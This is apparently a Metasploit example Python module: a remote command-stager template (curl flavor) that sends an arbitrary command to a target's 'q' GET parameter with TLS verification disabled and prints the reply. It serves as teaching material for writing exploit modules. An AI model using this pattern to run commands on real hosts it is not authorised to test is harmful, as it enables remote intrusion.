#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
from rich.console import Console
from rich.text import Text

# extra modules
dependencies_missing = False
try:
    import requests
except ImportError:
    dependencies_missing = True



metadata = {
    'name': 'Python Module Example',
    'description': '''
        Python communication with msfconsole.
    ''',
    'authors': [
        'Jacob Robles'
    ],
    'date': '2018-03-22',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://www.rapid7.com/blog/post/2017/12/28/regifting-python-in-metasploit/'},
        {'type': 'aka', 'ref': 'Coldstone'}
    ],
    'type': 'remote_exploit_cmd_stager',
    'targets': [
      {'platform':'linux', 'arch': 'x86'}
    ],
    'payload': {
        'command_stager_flavor': 'curl',
    },
    'options': {
        'targeturi': {'type': 'string', 'description': 'The base path', 'required': True, 'default': '/'},
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'command': {'type': 'string', 'description': 'The command to execute via the q GET parameter', 'required': True}
    },
}


def run(args):
    console = Console()

    if dependencies_missing:
        console.print("Module dependency (requests) is missing, cannot continue", style="bold red")
        return

    # Your code here
    try:
        # args['command'] is where the command stager command lives
        r = requests.get(f'https://{args["rhost"]}/{args["targeturi"]}/?q={args["command"]}', verify=False)
    except requests.exceptions.RequestException as e:
        console.print(e, style="bold red")
        return

    console.print(Text(f'{r.text[0:50]}...', style="bold green"))


